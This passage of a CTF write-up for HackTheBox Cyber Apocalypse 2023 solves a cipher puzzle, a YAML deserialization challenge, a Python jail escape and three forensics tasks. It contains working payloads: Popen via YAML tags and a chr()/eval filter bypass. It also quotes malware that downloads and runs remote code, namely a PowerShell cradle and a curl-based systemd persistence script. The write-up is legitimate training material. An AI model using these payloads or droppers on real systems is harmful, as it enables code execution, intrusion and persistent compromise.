We have a fair message, but there are some letters misplaced, so we can use [quipquip](https://quipqiup.com/) to solve this last step:

<p align="center">
  <img src="/images/ctfs/CyberApocalypse2023/13_2_quip.png" width="80%"/>
</p>

```
FREQUENCY ANALYSIS IS BASED ON THE FACT THAT IN ANY GIVEN STRETCH OF WRITTEN LANGUAGE CERTAIN LETTERS AND COMBINATIONS OF LETTERS OCCUR WITH VARYING FREQUENCIES MOREOVER THERE IS A CHARACTERISTIC DISTRIBUTION OF LETTERS THAT IS ROUGHLY 
THE SAME FOR ALMOST ALL SAMPLES OF THAT LANGUAGE IN CRYPTANALYSIS FREQUENCY ANALYSIS ALSO KNOWN AS COUNTING LETTERS IS THE STUDY OF THE FREQUENCY OF LETTERS OR GROUPS OF LETTERS IN A CIPHERTEXT THE METHOD IS USED AS AN AID TO BREAKING 
CLASSICAL CIPHERS FREQUENCY ANALYSIS REQUIRES ONLY A BASIC UNDERSTANDING OF THE STATISTICS OF THE PLAINTEXT LANGUAGE AND SOME PROBLEM SOLVING SKILLS AND IF PERFORMED BY HAND TOLERANCE FOR EXTENSIVE LETTER BOOKKEEPING DURING WORLD WAR 
II BOTH THE BRITISH AND THE AMERICANS RECRUITED CODEBREAKERS BY PLACING CROSSWORD PUZZLES IN MA:OR NEWSPAPERS AND RUNNING CONTESTS FOR WHO COULD SOLVE THEM THE FASTEST SEVERAL OF THE CIPHERS USED BY THE AXIS POWERS WERE BREAKABLE USING FREQUENCY 
ANALYSIS FOR EXAMPLE SOME OF THE CONSULAR CIPHERS USED BY THE :APANESE MECHANICAL METHODS OF LETTER COUNTING AND STATISTICAL ANALYSIS GENERALLY HTB{A_SIMPLE_SUBSTITUTION_IS_WEAK} CARD TYPE MACHINERY WERE FIRST USED IN WORLD WAR II POSSIBLY 
BY THE US ARMYS SIS TODAY THE HARD WORK OF LETTER COUNTING AND ANALYSIS HAS BEEN REPLACED BY COMPUTER SOFTWARE WHICH CAN CARRY OUT SUCH ANALYSIS IN SECONDS WITH MODERN COMPUTING POWER CLASSICAL CIPHERS ARE UNLIKELY TO PROVIDE ANY REAL PROTECTION 
FOR CONFIDENTIAL DATA PUZZLE PUZZLE PUZZLE
```

``` HTB{A_SIMPLE_SUBSTITUTION_IS_WEAK} ```



<br>

--- 

<br>


# Misc

## Hijack
The security of the alien spacecrafts did not prove very robust, and you have gained access to an interface allowing you to upload a new configuration to their ship's Thermal Control System. Can you take advantage of the situation without raising any suspicion?


We get an IP and a port _178.128.42.134:31264_. Using netcat,  we get prompted a menu. Exporting a configuration we get the following output:

<p align="center">
  <img src="/images/ctfs/CyberApocalypse2023/1_0_py.png" width="50%"/>
</p>

Decoding the payload form Base64 we get the following output, which is a YAML serialized payload:

```python
!!python/object:__main__.flag {IR_spectrometer_temp: '1', auto_calibration: '1',
  propulsion_temp: '8000', solar_array_temp: '8000', units: C}
```

We can also import configs and load them into the ship, so let's import a Popen object with the parameter _ls_ which is going to get executed when deserialized:

```python
# ISFweXRob24vb2JqZWN0L2FwcGx5OnN1YnByb2Nlc3MuUG9wZW4KLSBscw
!!python/object/apply:subprocess.Popen
- ls
```

<p align="center">
  <img src="/images/ctfs/CyberApocalypse2023/1_1_ls.png" width="50%"/>
</p>

We can see the flag.txt, let's grab it with a payload to run _cat flag.txt_. This time we need a tuple since Popen receives a list of strings, one per argument.

```python
# ISFweXRob24vb2JqZWN0L2FwcGx5OnN1YnByb2Nlc3MuUG9wZW4KLSAhIXB5dGhvbi90dXBsZQogIC0gY2F0CiAgLSBmbGFnLnR4dAo=
!!python/object/apply:subprocess.Popen
- !!python/tuple
  - cat
  - flag.txt
```

<p align="center">
  <img src="/images/ctfs/CyberApocalypse2023/1_2_flag.png" width="50%"/>
</p>

And we get the flag:

``` HTB{1s_1t_ju5t_m3_0r_iS_1t_g3tTing_h0t_1n_h3r3?} ```

<br>

## nehebkaus trap
In search of the ancient relic, you go looking for the Pharaoh's tomb inside the pyramids. A giant granite block falls and blocks your exit, and the walls start closing in! You are trapped. Can you make it out alive and continue your quest?

Connecting with netcat we can start checking that we are within an eval function in python. Time to escape.


<p align="center">
  <img src="/images/ctfs/CyberApocalypse2023/6_0_start.png" width="50%"/>
</p>


```python
# Input
print(globals())

[*] Input accepted!

{'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <_frozen_importlib_external.SourceFileLoader object at 0x7f10a406fc10>, '__spec__': None, '__annotations__': {}, '__builtins__': <module 'builtins' (built-in)>, '__file__': '/home/ctf/./jail.py', '__cached__': None, 'sys': <module 'sys' (built-in)>, 'time': <module 'time' (built-in)>, 'BLACKLIST': ('.', '_', '/', '"', ';', ' ', "'", ','), 'Color': <class '__main__.Color'>, '_print': <function _print at 0x7f10a40cbd90>, 'banner': <function banner at 0x7f10a400ac20>, 'loop': <function loop at 0x7f10a400acb0>, '_': 6}


# Input
> print(vars())

[*] Input accepted!

{'banned': [], 'inp': 'print(vars())'}

[!] The walls crush you!

#### Exit

# Input
print(dir())

[*] Input accepted!

['banned', 'inp'] 


# Input
print(dir(banned))

[*] Input accepted!

['__add__', '__class__', '__class_getitem__', '__contains__', '__delattr__', '__delitem__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__getitem__', '__gt__', '__hash__', '__iadd__', '__imul__', '__init__', '__init_subclass__', '__iter__', '__le__', '__len__', '__lt__', '__mul__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__reversed__', '__rmul__', '__setattr__', '__setitem__', '__sizeof__', '__str__', '__subclasshook__', 'append', 'clear', 'copy', 'count', 'extend', 'index', 'insert', 'pop', 'remove', 'reverse', 'sort']

```

Great, we have \_\_builtins\_\_ on reach, but we have the following blocklist to craft the payload:

```python
BLACKLIST = ('.', '_', '/', '"', ';', ' ', "'", ',')
```

Our target might be reading the flag.txt file like the rest of challenges (?). I will go for this first. I had two different approaches:

- Due to the 'loop' function spotted in the globals, we might be running in a for loop, therefore, we could overwrite the blacklist and it will take effect since it is a global variable and we are in the same execution everytime.

- Bypass the filter.

Checking the first option, I found a deadend, since nonce of the functions I spotted for setting/deleting the blacklist (_setattr()_, _delattr()_ and _del()_) do not work, since we need a comma for the multiple parameters or an space in case of the operator _del_. I tried many other things down the road, but none worked in this path, so the only option I had left was to bypass the filter.

Since I could not use the \" (double quote) or \' (single quote), the only way I could imagine to create a string object is to use _str()_ function concatenating _chr()_ to create different strings. I created the following script to get that payload:

```python
cmd = "open('flag.txt','r').read()" # Upsss, spoiler alert
payload = "str("
for c in cmd:
    payload += f"chr({ord(c)})+"

payload = payload[:-1] + ")"
print(payload)
``` 

So, now we need something to EVALuate that payload. _eval()_ will make the trick (yes, we can nest them without any problem, they will share global and local variables). And once the payload is evaluated, we need to see what it returned, a print will be handy.

```python
# Payload to read flag.txt
open('flag.txt','r').read()

# Bypass payload
str(chr(111)+chr(112)+chr(101)+chr(110)+chr(40)+
    chr(39)+chr(102)+chr(108)+chr(97)+chr(103)+
    chr(46)+chr(116)+chr(120)+chr(116)+chr(39)+
    chr(44)+chr(39)+chr(114)+chr(39)+chr(41)+chr(46)
    +chr(114)+chr(101)+chr(97)+chr(100)+chr(40)+chr(41))

# Final payload
print(eval(str(chr(111)+chr(112)+chr(101)+
    chr(110)+chr(40)+chr(39)+chr(102)+chr(108)
    +chr(97)+chr(103)+chr(46)+chr(116)+chr(120)
    +chr(116)+chr(39)+chr(44)+chr(39)+chr(114)
    +chr(39)+chr(41)+chr(46)+chr(114)+chr(101)
    +chr(97)+chr(100)+chr(40)+chr(41))))

```

Use the payload and get the flag!

<p align="center">
  <img src="/images/ctfs/CyberApocalypse2023/6_1_flag.png" width="80%"/>
</p>


<br>

--- 

<br>


# Forensic

## Plaintext Tleasure
Threat intelligence has found that the aliens operate through a command and control server hosted on their infrastructure. Pandora managed to penetrate their defenses and have access to their internal network. Because their server uses HTTP, Pandora captured the network traffic to steal the server's administrator credentials. Open the provided file using Wireshark, and locate the username and password of the admin.

Open the pcap on Wireshark, filter for HTTP, check the POST and get the form hexadecimal for the password:

<p align="center">
  <img src="/images/ctfs/CyberApocalypse2023/7_0_http.png" width="80%"/>
</p>


``` HTB{th3s3_4l13ns_st1ll_us3_HTTP} ```

<br>

## Alien Cradle
In an attempt for the aliens to find more information about the relic, they launched an attack targeting Pandora's close friends and partners that may know any secret information about it. During a recent incident believed to be operated by them, Pandora located a weird PowerShell script from the event logs, otherwise called PowerShell cradle. These scripts are usually used to download and execute the next stage of the attack. However, it seems obfuscated, and Pandora cannot understand it. Can you help her deobfuscate it?

Just inspect the provided payload:

```bash
if([System.Security.Principal.WindowsIdentity]::GetCurrent().Name -ne 'secret_HQ\Arth'){exit};$w = New-Object net.webclient;$w.Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;$d = $w.DownloadString('http://windowsliveupdater.com/updates/33' + '96f3bf5a605cc4' + '1bd0d6e229148' + '2a5/2_34122.gzip.b64');$s = New-Object IO.MemoryStream(,[Convert]::FromBase64String($d));$f = 'H' + 'T' + 'B' + '{p0w3rs' + 'h3ll' + '_Cr4d' + 'l3s_c4n_g3t' + '_th' + '3_j0b_d' + '0n3}';IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();
```

``` HTB{p0w3rsh3ll_Cr4dl3s_c4n_g3t_th3_j0b_d0n3} ```

<br>

## Extraterrestrial Persistence

There is a rumor that aliens have developed a persistence mechanism that is impossible to detect. After investigating her recently compromised Linux server, Pandora found a possible sample of this mechanism. Can you analyze it and find out how they install their persistence?

We have the following "malware":

```bash
n=`whoami`
h=`hostname`
path='/usr/local/bin/service'
if [[ "$n" != "pandora" && "$h" != "linux_HQ" ]]; then exit; fi

curl https://files.pypi-install.com/packeges/service -o $path

chmod +x $path

echo -e "W1VuaXRdCkRlc2NyaXB0aW9uPUhUQnt0aDNzM180bDEzblNfNHIzX3MwMDAwMF9iNHMxY30KQWZ0ZXI9bmV0d29yay50YXJnZXQgbmV0d29yay1vbmxpbmUudGFyZ2V0CgpbU2VydmljZV0KVHlwZT1vbmVzaG90ClJlbWFpbkFmdGVyRXhpdD15ZXMKCkV4ZWNTdGFydD0vdXNyL2xvY2FsL2Jpbi9zZXJ2aWNlCkV4ZWNTdG9wPS91c3IvbG9jYWwvYmluL3NlcnZpY2UKCltJbnN0YWxsXQpXYW50ZWRCeT1tdWx0aS11c2VyLnRhcmdldA=="|base64 --decode > /usr/lib/systemd/system/service.service

systemctl enable service.service
```

Decoding the base64 use to create the service, we find the flag:

```bash
[Unit]
Description=HTB{th3s3_4l13nS_4r3_s00000_b4s1c}
After=network.target network-online.target

[Service]
Type=oneshot
RemainAfterExit=yes

ExecStart=/usr/local/bin/service
ExecStop=/usr/local/bin/service

[Install]
WantedBy=multi-user.target
```

``` HTB{th3s3_4l13nS_4r3_s00000_b4s1c} ```


Thanks all for this CTF, hope you enjoyed it!

